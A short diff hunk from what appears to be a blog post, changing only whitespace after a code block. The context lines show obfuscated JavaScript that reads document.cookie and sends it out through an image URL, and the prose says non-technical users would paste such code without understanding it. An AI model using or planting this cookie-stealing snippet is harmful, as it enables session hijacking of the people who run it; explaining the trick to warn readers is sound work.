@@ -106,7 +106,7 @@ var _0xba4e=["\x63\x6F\x6F\x6B\x69\x65"];
 var j=document[_0xba4e[0]];
 i.src = concat(s,'?c=', j);
 document.getElementById('awardlink').appendChild(i);
-{% endhighlight %}        
+{% endhighlight %}    
         
 Of course, it can look bad for our trained eyes… but for those who don’t “work on computers” they’ll just think its code they don’t understand and use it.
 
